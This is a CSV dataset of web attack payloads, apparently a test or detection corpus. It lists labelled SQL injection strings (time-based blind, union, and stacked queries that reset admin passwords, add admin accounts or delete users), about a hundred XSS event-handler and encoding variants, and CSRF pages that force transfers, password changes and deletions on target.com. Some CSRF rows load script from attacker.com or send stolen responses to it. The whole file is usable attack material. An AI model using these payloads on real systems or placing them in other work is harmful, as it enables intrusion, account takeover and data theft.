id,attack_class,type,severity,context,payload_hash,payload
sqli-066,SQLi,tautology,medium,Login username,d77c3dc9ae99,' OR 0x41=0x41--
sqli-067,SQLi,blind-time,medium,Search input,e64b3021284c,' OR SLEEP(11)--
sqli-069,SQLi,blind-time,medium,ID parameter,9a1bd9f382b0,' OR pg_sleep(12)--
sqli-070,SQLi,stacked-queries,critical,User input,efc270cbc596,'; UPDATE users SET password='newpass' WHERE username='admin'--
sqli-071,SQLi,blind-time,medium,Search input,01c0a614fa49,' OR SLEEP(12)--
sqli-072,SQLi,union,high,Search input,3538343fb033,"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='orders'--"
sqli-073,SQLi,boolean-blind,medium,Login input,fceb7421ac10,"' OR SUBSTRING(user(),1,1)='c'--"
sqli-074,SQLi,stacked-queries,critical,User input,d2dadb2bceb9,"'; INSERT INTO users (username, password, role) VALUES ('admin2', 'pass123', 'admin')--"
sqli-075,SQLi,blind-time,medium,ID parameter,0da72eba179d,' OR pg_sleep(8)--
sqli-076,SQLi,union,high,Search input,a46b83122f1c,"' UNION SELECT @@version, NULL--"
sqli-078,SQLi,blind-time,medium,User ID input,6c17d48159f4,'; WAITFOR DELAY '0:0:8'--
sqli-079,SQLi,boolean-blind,medium,Search input,e53eebf930d1,"' OR SUBSTRING(@@version,1,1)='7'--"
sqli-081,SQLi,blind-time,medium,User input,53ac2eb71e68,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(8))--
sqli-082,SQLi,stacked-queries,critical,User input,793cc4fd6418,'; DELETE FROM users WHERE username='admin'--
sqli-083,SQLi,tautology,medium,Login username,357f103f32eb,' OR 0x42=0x42--
sqli-084,SQLi,blind-time,medium,Search input,7db046800de0,' OR SLEEP(13)--
sqli-086,SQLi,blind-time,medium,ID parameter,947d6a7bf9f7,' OR pg_sleep(14)--
sqli-088,SQLi,boolean-blind,medium,Search input,c8ea7a7d88f8,"' OR SUBSTRING(user(),1,1)='d'--"
sqli-090,SQLi,stacked-queries,critical,User input,dc0d0e7ca49a,"'; INSERT INTO users (username, password, role) VALUES ('superadmin', 'pass456', 'admin')--"
sqli-091,SQLi,blind-time,medium,User ID input,d2cbeca39279,'; WAITFOR DELAY '0:0:9'--
sqli-092,SQLi,boolean-blind,medium,Search input,57b9cd711d86,"' OR SUBSTRING(@@version,1,1)='6'--"
sqli-094,SQLi,blind-time,medium,User input,470fefa04c05,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(9))--
sqli-096,SQLi,tautology,medium,Login username,e74a0969511a,' OR 0x43=0x43--
sqli-097,SQLi,blind-time,medium,Search input,b1faf0fe529d,' OR SLEEP(14)--
sqli-099,SQLi,blind-time,medium,ID parameter,efea1371e429,' OR pg_sleep(15)--
sqli-100,SQLi,stacked-queries,critical,User input,a9f38e932075,'; UPDATE users SET password='securepass' WHERE username='admin'--
xss-001,XSS,reflected,high,URL parameter,1b4978d617f5,<script>alert('XSS1')</script>
xss-002,XSS,reflected,high,URL parameter,78abecf0a736,<img src=x onerror=alert('XSS2')>
xss-003,XSS,stored,high,Comment input,ba65bff15667,<script>alert('XSS3')</script>
xss-004,XSS,reflected,high,URL parameter,ed8e7ea05207,"<a href='javascript:alert(""XSS4"")'>click</a>"
xss-005,XSS,reflected,high,URL parameter,99c3fbbe07bb,<input autofocus onfocus=alert('XSS5')>
xss-006,XSS,stored,high,User profile bio,bab8e85a5967,"<iframe src='javascript:alert(""XSS6"")'></iframe>"
xss-007,XSS,reflected,high,URL parameter,5755f13cd141,<svg onload=alert('XSS7')>
xss-008,XSS,reflected,high,URL parameter,82b698be77b5,<body onload=alert('XSS8')>
xss-009,XSS,stored,high,User input field,1b7c1bea0720,<div onclick=alert('XSS9')>Click me</div>
xss-010,XSS,reflected,high,URL parameter,5192d21f6c4e,"<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS10"")'>"
xss-011,XSS,reflected,high,URL parameter,05c97df6ba07,"<style>body{background:url(""javascript:alert('XSS11')"")}</style>"
xss-012,XSS,reflected,high,URL parameter,459dc0a8cb89,%3Cscript%3Ealert('XSS12')%3C/script%3E
xss-013,XSS,stored,high,User input field,b66661b86b28,<span onmouseover=alert('XSS13')>Hover me</span>
xss-014,XSS,reflected,high,URL parameter,da2c70c5e510,"<iframe srcdoc=""<script>alert('XSS14')</script>""></iframe>"
xss-015,XSS,reflected,high,URL parameter,0f2965fb50a4,"<object data='javascript:alert(""XSS15"")'></object>"
xss-016,XSS,stored,high,User input field,113855d37fc4,<form onsubmit=alert('XSS16')><input type='submit'></form>
xss-017,XSS,reflected,high,URL parameter,7e04cfc6f1e7,<video src=x onerror=alert('XSS17')></video>
xss-018,XSS,reflected,high,URL parameter,57d409b21444,<audio src=x onerror=alert('XSS18')></audio>
xss-019,XSS,stored,high,User input field,ca38aa288fce,<textarea onfocus=alert('XSS19')>Focus me</textarea>
xss-020,XSS,reflected,high,URL parameter,0b92187665b3,"<math href='javascript:alert(""XSS20"")'>X</math>"
xss-021,XSS,reflected,high,URL parameter,0ff481084eaa,"<base href=""javascript:alert('XSS21');//"">"
xss-022,XSS,stored,high,User input field,d0472896e256,"<a href='#' onclick='alert(""XSS22"")'>Click me</a>"
xss-023,XSS,reflected,high,URL parameter,f26fb92aa405,"<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS23"")'>"
xss-024,XSS,stored,high,User input field,872e4ff7b577,"<button onclick='alert(""XSS24"")'>Click</button>"
xss-025,XSS,reflected,high,URL parameter,4911dd824d42,<form onreset=alert('XSS25')><input type='reset'></form>
xss-026,XSS,stored,high,User input field,11a90254bb71,<marquee onstart=alert('XSS26')>Scrolling text</marquee>
xss-027,XSS,reflected,high,URL parameter,ce92ef0e5810,"<embed src='javascript:alert(""XSS27"")'>"
xss-028,XSS,stored,high,User input field,8246932eb788,"<bgsound src='javascript:alert(""XSS28"")'>"
xss-029,XSS,reflected,high,URL parameter,24a1cc7010e7,<xml onload=alert('XSS29')>
xss-030,XSS,stored,high,User input field,72ffaf1ded30,"<iframe src='about:blank' onload='alert(""XSS30"")'></iframe>"
xss-031,XSS,reflected,high,URL parameter,8b3e48691abb,<svg><animate attributeName='onbegin' begin='0s' dur='1s' repeatCount='1' fill='freeze' to='alert(1)'/></svg>
xss-032,XSS,stored,high,User profile input,4bac8a03df5d,"<base href=""javascript:alert('XSS32');//"">"
xss-033,XSS,reflected,high,URL parameter,58d9dd39b3ea,<iframe srcdoc='%3Cscript%3Ealert(33)%3C/script%3E'></iframe>
xss-034,XSS,stored,high,User input field,1a26e9dbb8b8,"<div onpointerover='alert(""XSS34"")'>Hover me</div>"
xss-035,XSS,reflected,high,URL parameter,29a4ba1ebf02,<script>alert(XSS35)</script>
xss-036,XSS,stored,high,User input field,52375d4e2983,<svg><foreignObject><body><script>alert('XSS36')</script></body></foreignObject></svg>
xss-037,XSS,reflected,high,URL parameter,fdc751b68e3f,"<div style='animation-name:x' onanimationstart='alert(""XSS37"")'>Test</div>"
xss-038,XSS,stored,high,User input field,891c532302a9,"<input oninput='alert(""XSS38"")'>"
xss-039,XSS,reflected,high,URL parameter,ab94684d417a,<script>eval(alert('XSS39'))</script>
xss-040,XSS,stored,high,User input field,1fe856872d68,"<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNDAnKTs8L3NjcmlwdD4='></object>"
xss-041,XSS,reflected,high,URL parameter,ce5e1e1f70c0,"<span onpointerdown='alert(""XSS41"")'>Click me</span>"
xss-042,XSS,stored,high,User input field,4e5add648409,"<math href='javascript:alert(""XSS42"")'>X</math>"
xss-043,XSS,reflected,high,URL parameter,cfbb2dc10b73,"<iframe sandbox='allow-scripts' srcdoc='<script>alert(""XSS43"")</script>'></iframe>"
xss-044,XSS,stored,high,User input field,e76bd9163fa8,"<video oncanplay='alert(""XSS44"")'></video>"
xss-045,XSS,reflected,high,URL parameter,851c4af192f7,"<meta http-equiv='refresh' content='0;url=javascript&#58;alert(""XSS45"")'>"
xss-046,XSS,stored,high,User input field,362f11fc3402,"<svg><set attributeName='onbegin' to='alert(""XSS46"")' begin='0s' dur='1s'/></svg>"
xss-047,XSS,reflected,high,URL parameter,33e160eeb11b,"<script>setTimeout('alert(""XSS47"")',0)</script>"
xss-048,XSS,stored,high,User input field,2557bf980db5,"<details ontoggle='alert(""XSS48"")'><summary>Click me</summary></details>"
xss-049,XSS,reflected,high,URL parameter,40b8877b4516,"<input formaction='javascript:alert(""XSS49"")' type='submit'>"
xss-050,XSS,stored,high,User input field,c7f79b7757fc,"<svg><animateMotion onbegin='alert(""XSS50"")' dur='1s' repeatCount='1'/></svg>"
xss-051,XSS,reflected,high,URL parameter,bc26074b80cd,"<script>setInterval(function(){alert('XSS51')},1000)</script>"
xss-052,XSS,stored,high,User input field,36a82ab6c0e3,"<iframe srcdoc='<script>alert(""XSS52"")</script>' onload='alert(""XSS52"")'></iframe>"
xss-053,XSS,reflected,high,URL parameter,15db1dd5e91a,"<svg onload='alert(""XSS53"")'><script>alert('XSS53')</script></svg>"
xss-054,XSS,stored,high,User input field,bf6ef12cba93,"<iframe src='javascript:alert(""XSS54"")'></iframe>"
xss-055,XSS,reflected,high,URL parameter,8b7147d4fc93,"<object type='text/html' data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNTUnKTs8L3NjcmlwdD4='></object>"
xss-056,XSS,stored,high,User input field,9ba7008877de,"<svg onload='setTimeout(function(){alert(""XSS56"")},0)'></svg>"
xss-057,XSS,reflected,high,URL parameter,08c7a03b5458,"<iframe srcdoc=""&lt;script&gt;alert('XSS57')&lt;/script&gt;""></iframe>"
xss-058,XSS,stored,high,User input field,7508c7281399,"<svg><animateTransform attributeName='onbegin' to='alert(""XSS58"")' begin='0s' dur='1s'/></svg>"
xss-059,XSS,reflected,high,URL parameter,e863e8d5a936,"<script>Function('alert(""XSS59"")')()</script>"
xss-060,XSS,stored,high,User input field,cce69b1e3fed,"<iframe onload='alert(""XSS60"")' srcdoc='%3Cscript%3Ealert(%22XSS60%22)%3C/script%3E'></iframe>"
xss-061,XSS,reflected,high,URL parameter,83fafb627b95,<svg><filter><feImage xlink:href='javascript:alert(61)' onload='alert(61)'/></filter></svg>
xss-062,XSS,stored,high,User input field,04132a0b3261,"<details ontoggle='alert(""XSS62"")'><summary>Click me</summary></details>"
xss-063,XSS,reflected,high,URL parameter,7c2adfc93969,"<math href='javascript:alert(""XSS63"")'>X</math>"
xss-064,XSS,stored,high,User input field,fd0ef3eeaea8,"<audio src='x' onerror='alert(""XSS64"")'></audio>"
xss-065,XSS,reflected,high,URL parameter,492945f5bd0d,"<iframe srcdoc='<script>alert(""XSS65"")</script>' onload='alert(""XSS65"")'></iframe>"
xss-066,XSS,stored,high,User input field,021e3be86014,"<svg><animateMotion onbegin='alert(""XSS66"")' dur='1s' repeatCount='1'/></svg>"
xss-067,XSS,reflected,high,URL parameter,4a365c109941,"<input oninvalid='alert(""XSS67"")' required>"
xss-068,XSS,stored,high,User input field,386f1db5b067,"<iframe allow='scripts' srcdoc='<script>alert(""XSS68"")</script>'></iframe>"
xss-069,XSS,reflected,high,URL parameter,476523cd89ca,"<svg tabindex='1' onfocusin='alert(""XSS69"")'></svg>"
xss-070,XSS,stored,high,User input field,6d8f20967cf6,"<video onpause='alert(""XSS70"")'></video>"
xss-071,XSS,reflected,high,URL parameter,b8d1f64c2ae1,"<svg onmouseenter='alert(""XSS71"")'></svg>"
xss-072,XSS,stored,high,User input field,c030ca856118,"<form oninput='alert(""XSS72"")'><input></form>"
xss-073,XSS,reflected,high,URL parameter,2ab53cb12a29,"<svg onwheel='alert(""XSS73"")'></svg>"
xss-074,XSS,stored,high,User input field,ba50a8f0cd71,"<iframe allowfullscreen onload='alert(""XSS74"")'></iframe>"
xss-075,XSS,reflected,high,URL parameter,5a97ec0e3903,"<svg onanimationend='alert(""XSS75"")'></svg>"
xss-076,XSS,stored,high,User input field,e935976b7a7d,"<audio onplay='alert(""XSS76"")'></audio>"
xss-077,XSS,reflected,high,URL parameter,c8fd27852076,"<svg onscroll='alert(""XSS77"")' style='overflow:auto;height:10px;'></svg>"
xss-078,XSS,stored,high,User input field,d9a11d8c188b,"<iframe seamless onload='alert(""XSS78"")'></iframe>"
xss-079,XSS,reflected,high,URL parameter,06e040ad1415,"<svg oncut='alert(""XSS79"")'></svg>"
xss-080,XSS,stored,high,User input field,ca200f8ca384,"<svg oncopy='alert(""XSS80"")'></svg>"
xss-081,XSS,reflected,high,URL parameter,fd22eaff922e,"<svg onpaste='alert(""XSS81"")'></svg>"
xss-082,XSS,stored,high,User input field,2ec5c9a653b0,"<svg onreset='alert(""XSS82"")'></svg>"
xss-083,XSS,reflected,high,URL parameter,097f94a8796e,"<svg onsearch='alert(""XSS83"")'></svg>"
xss-084,XSS,stored,high,User input field,0d798c7acfba,"<svg onselect='alert(""XSS84"")'></svg>"
xss-085,XSS,reflected,high,URL parameter,cb535c3669f4,"<svg onshow='alert(""XSS85"")'></svg>"
xss-086,XSS,stored,high,User input field,83abcb8a6517,"<svg ontoggle='alert(""XSS86"")'></svg>"
xss-087,XSS,reflected,high,URL parameter,310d2ee7406e,"<svg ontransitionend='alert(""XSS87"")'></svg>"
xss-088,XSS,stored,high,User input field,0568c4e90d56,"<svg onunload='alert(""XSS88"")'></svg>"
xss-089,XSS,reflected,high,URL parameter,1924fa4dc3a1,"<svg onvolumechange='alert(""XSS89"")'></svg>"
xss-090,XSS,stored,high,User input field,318c67389ace,"<svg onwaiting='alert(""XSS90"")'></svg>"
xss-091,XSS,reflected,high,URL parameter,457c1d546aef,"<svg onwheel='alert(""XSS91"")' style='animation:spin 1s linear infinite'></svg>"
xss-092,XSS,stored,high,User input field,d6b195fb00bc,"<svg onpointercancel='alert(""XSS92"")'></svg>"
xss-093,XSS,reflected,high,URL parameter,1d0cd75bac24,"<svg onpointerout='alert(""XSS93"")'></svg>"
xss-094,XSS,stored,high,User input field,fc01335c0868,"<svg onpointerover='alert(""XSS94"")'></svg>"
xss-095,XSS,reflected,high,URL parameter,0ff67572e0dd,"<svg onpointerup='alert(""XSS95"")'></svg>"
xss-096,XSS,stored,high,User input field,700786cfd413,"<svg onselectstart='alert(""XSS96"")'></svg>"
xss-097,XSS,reflected,high,URL parameter,46d5ea12d0ef,"<svg tabindex='0' onshow='alert(""XSS97"")'></svg>"
xss-098,XSS,stored,high,User input field,51571d70e08b,"<svg onstalled='alert(""XSS98"")'></svg>"
xss-099,XSS,reflected,high,URL parameter,a65e01594cf2,"<svg onsubmit='alert(""XSS99"")'></svg>"
xss-100,XSS,stored,high,User input field,2336638f6e3c,"<svg onunload='alert(""XSS100"")'><script>alert('XSS100')</script></svg>"
csrf-001,CSRF,CSRF,high,Malicious webpage,ff2cc194f7cb,<form action='https://target.com/change-password' method='POST' id='csrfForm'><input type='hidden' name='password' value='hacked123'/></form><script>document.getElementById('csrfForm').submit();</script>
csrf-002,CSRF,CSRF,medium,Malicious webpage,6c687d4f4d8e,<img src='https://target.com/delete-account?confirm=yes' style='display:none'/>
csrf-003,CSRF,CSRF,high,Malicious webpage,7e3061f36552,"<script>var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/transfer',true);xhr.withCredentials=true;xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('amount=1000&to=attacker');</script>"
csrf-004,CSRF,CSRF,high,Malicious webpage,7587f0801424,"<script>fetch('https://target.com/update-email',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'email=attacker@example.com'});</script>"
csrf-005,CSRF,CSRF,medium,Malicious webpage,a91e76494ba6,<form action='https://target.com/upload-avatar' method='POST' enctype='multipart/form-data' id='csrfForm'><input type='file' name='avatar' value='malicious.jpg'/></form><script>document.getElementById('csrfForm').submit();</script>
csrf-006,CSRF,CSRF,medium,Malicious webpage,1ee00cf67dcb,<meta http-equiv='refresh' content='0;url=https://target.com/subscribe?plan=premium'/>
csrf-007,CSRF,CSRF,high,Malicious webpage,1fc35eb3392f,<script src='https://attacker.com/csrf-trigger.js'></script>
csrf-008,CSRF,CSRF,high,Malicious webpage,37d767acccaa,"<iframe style='display:none' srcdoc=""<form action='https://target.com/settings' method='POST' id='f'><input name='setting' value='danger'/></form><script>document.getElementById('f').submit();</script>""></iframe>"
csrf-009,CSRF,CSRF,high,Malicious webpage,e1c0395d88a9,<svg><script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script></svg>
csrf-010,CSRF,CSRF,medium,Malicious webpage,5c46282a1f28,"<script>navigator.sendBeacon('https://target.com/track', 'data=malicious');</script>"
csrf-011,CSRF,CSRF,high,Malicious webpage,c39f13593e27,"<form action='https://target.com/update' method='POST' onsubmit='this.data.value=""hacked""'><input name='data' value='original'/></form><script>document.forms[0].submit();</script>"
csrf-012,CSRF,CSRF,high,Malicious webpage,d809ad34500c,"<img src='invalid.jpg' onerror=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/like',true);xhr.withCredentials=true;xhr.send('post=123');"">"
csrf-013,CSRF,CSRF,high,Malicious webpage,c926fb983e67,<form action='https://target.com/transfer' method='POST' id='f'><input type='hidden' name='amount' value='1000'/><input type='hidden' name='to' value='attacker'/></form><script>document.getElementById('f').submit();</script>
csrf-014,CSRF,CSRF,high,Malicious webpage,5a059c60e8ab,"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',headers:{'X-CSRF-Token':'fake'},body:'value=1'});</script>"
csrf-015,CSRF,CSRF,medium,Malicious webpage,70585676a5c1,<form action='https://target.com/upload' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='file'/></form><script>document.getElementById('f').submit();</script>
csrf-016,CSRF,CSRF,high,Malicious webpage,8d81a79ee7e2,"<script>setTimeout(function(){fetch('https://target.com/api/delete',{method:'POST',credentials:'include'});},1000);</script>"
csrf-017,CSRF,CSRF,high,Malicious webpage,0907082dc674,<iframe name='hiddenFrame' style='display:none'></iframe><form action='https://target.com/settings' method='POST' target='hiddenFrame' id='f'><input name='setting' value='danger'/></form><script>document.getElementById('f').submit();</script>
csrf-018,CSRF,CSRF,medium,Malicious webpage,2a6fd49b2b4c,<form action='https://target.com/add-friend' method='GET' id='f'><input name='user' value='attacker'/></form><script>document.getElementById('f').submit();</script>
csrf-019,CSRF,CSRF,high,Malicious webpage,77a2d13fed16,<form id='f' action='https://target.com/subscribe' method='POST'><input name='plan' value='premium'/></form><script>document.getElementById('f').submit();</script>
csrf-020,CSRF,CSRF,medium,Malicious webpage,4f4b2e0acba6,"<script>navigator.sendBeacon('https://target.com/api/track', 'action=subscribe');</script>"
csrf-021,CSRF,CSRF,high,Malicious webpage,ee8b0e8aa8e4,"<iframe style='display:none' id='f'></iframe><form action='https://target.com/api/transfer' method='POST' target='f' id='form'><input name='amount' value='9999'/><input name='to' value='attacker'/></form><script>setTimeout(()=>document.getElementById('form').submit(),2000);</script>"
csrf-022,CSRF,CSRF,critical,Malicious webpage,b4a3cb7aaf70,"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',body:'setting=evil'}).then(r=>r.text()).then(t=>fetch('https://attacker.com/log?data='+encodeURIComponent(t)));</script>"
csrf-023,CSRF,CSRF,high,Malicious webpage,c9c5e7a165d1,<form action='https://target.com/api/settings' method='POST' id='f'><input type='hidden' name='mode' value='stealth'/><input type='hidden' name='level' value='admin'/></form><script>document.getElementById('f').submit();</script>
csrf-024,CSRF,CSRF,high,Malicious webpage,00c76245ee0e,"<img src='https://target.com/api/trigger' onload=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/api/confirm',true);xhr.withCredentials=true;xhr.send('confirm=yes');"">"
csrf-026,CSRF,CSRF,medium,Malicious webpage,9bff94b7b388,"<script>navigator.sendBeacon('https://target.com/api/track','action=steal');</script>"
csrf-027,CSRF,CSRF,medium,Malicious webpage,a01ffc9e0cb3,<form action='https://target.com/api/upload' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='file'/></form><script>document.getElementById('f').submit();</script>
csrf-028,CSRF,CSRF,high,Malicious webpage,9214122703a4,"<iframe style='display:none' srcdoc=""<form action='https://target.com/api/modify' method='POST' id='f'><input name='param' value='evil'/></form><script>document.getElementById('f').submit();</script>""></iframe>"
csrf-029,CSRF,CSRF,high,Malicious webpage,335278d40f21,"<script>setTimeout(()=>fetch('https://target.com/api/step1',{method:'POST',credentials:'include'}),1000);setTimeout(()=>fetch('https://target.com/api/step2',{method:'POST',credentials:'include'}),3000);</script>"
csrf-030,CSRF,CSRF,high,Malicious webpage,6ce8562d3c80,<iframe name='hidden' style='display:none'></iframe><form action='https://target.com/api/settings' method='POST' target='hidden' id='f'><input name='mode' value='stealth'/></form><script>document.getElementById('f').submit();</script>
csrf-031,CSRF,CSRF,high,Malicious webpage,b5a582fcf8c7,"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',headers:{'X-CSRF-Token':'fake'},body:'data=evil'});</script>"
